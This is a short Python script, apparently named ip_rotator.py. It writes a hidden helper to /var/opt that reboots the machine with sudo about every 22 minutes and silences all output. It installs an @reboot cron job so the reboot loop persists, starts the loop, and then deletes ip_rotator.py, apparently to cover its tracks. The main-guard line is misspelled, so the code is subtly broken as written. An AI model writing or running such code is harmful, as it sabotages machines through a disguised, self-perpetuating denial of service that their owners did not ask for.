import os
import subprocess

def create_restart_script():
    
    restart_script_content = """#!/usr/bin/env python3
import time
import os

while True:
    time.sleep(1300)  # 1300 seconds (about 22 minutes)
    os.system("sudo /sbin/shutdown -r now > /dev/null 2>&1")
"""

    
    with open('/var/opt/restart_script.py', 'w') as file:
        file.write(restart_script_content)

    
    os.chmod('/var/opt/restart_script.py', 0o755)

def add_cron_job():
    
    cron_job = "@reboot /usr/bin/python3 /var/opt/restart_script.py"
    subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab -", shell=True)

def run_restart_script():
    subprocess.Popen(['sudo', 'python3', '/var/opt/restart_script.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if _name_ == "_main_":
    
    create_restart_script()
    
    
    add_cron_job()
    
    
    run_restart_script()
    
    
    try:
        os.remove('ip_rotator.py')
    except FileNotFoundError:
        pass
